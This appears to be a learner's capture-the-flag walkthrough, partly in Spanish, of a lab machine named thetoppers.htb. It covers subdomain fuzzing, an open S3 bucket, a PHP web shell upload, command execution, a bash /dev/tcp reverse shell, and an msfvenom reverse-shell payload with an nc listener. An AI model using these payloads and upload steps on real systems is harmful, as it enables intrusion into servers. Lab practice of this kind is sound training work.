
Im learning about how to fuzz dns..  I found one in the email on the contact form ... with 

this is the way to found dns with ffuf
```
ffuf -c -w /home/cds/Downloads/subdomains-top1million-20000.txt -u http://thetoppers.htb -H "Host:FUZZ.thetoppers.htb"
```
but the output is extremely long..

I was falling with gobuster because i need to use VHOST when the machine is in the same net, or virutal net.. is my virtual host...


I can fuzz with gobuster but im not able to do it well.. i dont know why.. im going to sleep right now ... we'll see tomorrow 
```
gobuster vhost -u http://thetoppers.htb -w /home/cds/Downloads/subdomains-top1million-5000.txt -t 100 
```



Ok, its a new day, the fact was that I need to put just --apend domain on gobuster

```
gobuster vhost --append-domain -w /home/cds/Downloads/subdomains-top1million-5000.txt -u http://thetoppers.htb -t 100 
```

Ok, now will not see the errors with :

```
gobuster vhost --append-domain -w /home/cds/Downloads/subdomains-top1million-5000.txt -u http://thetoppers.htb -t 100 --no-error 
```

Gobuster found this two sub domains
```
Found: s3.thetoppers.htb Status: 502 [Size: 424]
Found: gc._msdcs.thetoppers.htb Status: 400 [Size: 306]
```

# 502 Puerta de enlace no válida

Un Error 502 Bad Gateway indicará que **el servidor recibió una respuesta inválida desde el servidor entrante**. Esto sucederá si el sitio usa un servidor proxy o puerta de enlace. El mensaje de error puede variar según el navegador que utilices y el servidor al que estés intentando acceder.

So, maybe if I put this on the /etc/host I can acces it s3.thetoppers.htb



# 400#

El código de estado 400 (Bad Request) indica que **el servidor no puede o no quiere procesar la solicitud debido a algo que se percibe como un error del cliente** (por ejemplo, una sintaxis de solicitud mal formada, un encuadre de mensaje de solicitud no válido o un enrutamiento de solicitud engañoso).




Ok we just see an object of json {"status":"running"}


# WHAT IS S3 ? #
Amazon S3 o Amazon Simple Storage Service es un servicio ofrecido por Amazon Web Services que proporciona almacenamiento de objetos a través de una interfaz de servicio web. ​ Amazon S3 utiliza la misma infraestructura de almacenamiento escalable que utiliza Amazon.com para ejecutar su red de comercio electrónico.


We will use a tool called _awscli_ to list the S3 objects.

```
sudo apt install awscli -y
```

and now configure the aws and just insert temp in all the fields

```
aws configure
```

THE OPTIMUM OPTION IS PUTTING ALL TOGETHER 

```
sudo apt update && sudo apt install awscli -y aws configure
```


![[Screenshot_2023-08-31_11_33_03.png]]

Now we will listen the items on the cloud bucket with this 

```
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```
s3 ls lists all the files on thetoppers.htb


Ok, now the idea is that , as we can see , behind of thee website the toopers we are watching that there is working an apache server, and the amazon cloud, and other technologies. Generally on the apache servers runs with php, and on the cloud we see a index.php, so if we can put a file that can do remote commands to us from the url we can have a reverse shell.


```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

now, if we want to put this file, we must use

```
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

so, we did it because we recive this

```
upload: ./shell.php to s3://thetoppers.htb/shell.php
```

we can execute things on this place

```
http://thetoppers.htb/shell.php?cmd=whoami
```
response
```
www-data
```

ok im going to try to get a reverse shell and explore on the machine.

```
http://thetoppers.htb/shell.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.10.14.57/443 0>%261"
```

I did it, i get the flag, but another guy did it on this way :
-------------------------------------------------------------------------



Successfully executed the `ls` command, because were able to list the contents of the directory.


with burpsuit


Captured the request with Burp Suite and sent it to the Repeater tab. Navigated back one directory and listed the contents with the command: `ls+../`

The root flag can be found in the file flag.txt. The content of the file flag.txt can be read with the command: `cat+../flag.txt`

![[Screenshot_2023-08-31_12_24_18.png]]


And another one was a reverse shell with msfvenom

He generated all automatically with venom...
```
msfvenom -p php/reverse_php LHOST=10.10.14.76 LPORT=443 -f raw -o reverse.php
```
and then 

he put it on the cloud 

```
aws --endpoint=http://s3.thetoppers.htb s3 cp reverse.php s3://thetoppers.htb
```

he listen on the port 443 

```
nc -lvnp 443
```

and with curl (not the navigator) he called the reverse shell

```
curl http://thetoppers.htb/reverse.php
```
